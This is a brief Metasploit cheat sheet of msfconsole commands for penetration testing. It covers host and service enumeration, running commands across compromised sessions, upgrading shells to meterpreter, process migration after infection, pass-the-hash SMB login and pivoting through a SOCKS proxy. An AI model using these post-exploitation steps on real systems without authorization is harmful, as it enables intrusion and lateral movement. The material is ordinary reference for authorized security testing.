### source
https://github.com/rapid7/metasploit-framework  

### execute before start of msfconsole
```
msf> systemctl start postgresql
```

### initiate db
```
msf> msfdb init
```

### check status
```
msf> db_status
```

### list windows 2008 server
```
msf> hosts -u -S 2008
```

### show services of specific host
```
msf> services <rhost>
```

### set rhosts for specific open port
```
msf> services -R -u -p <rport>
```

### execute command on all sessions
```
msf> sessions -c ipconfig
```

### upgrade a shell session
```
msf> use post/multi/manage/shell_to_meterpreter
```

### shortcut for choosing correct handler inside the context of payload module
```
msf> to_handler
```

### automigrate to another process, directly after infecting target
```
msf> set AutoRunScript post/windows/manage/migrate
```

### smb_login with ntlm hash
```
ms> set smbpass <nthash:nthash>
```

### load powershell script into current meterpreter session
```
mtr> powershell_import <localFile>.ps1
```

### tunnel traffic trough proxy
```
msf> set PROXIES HTTP:127.0.0.1:8080
```

### pivoting using proxychains
```
msf> auxiliary/server/socks_proxy
msf> set version 4a
msf> route add <ipRange> <sessionId>
msf> run -j
```

### adjust listening port in vim /etc/proxychains4.con
```
socks4  127.0.0.1 1080
```

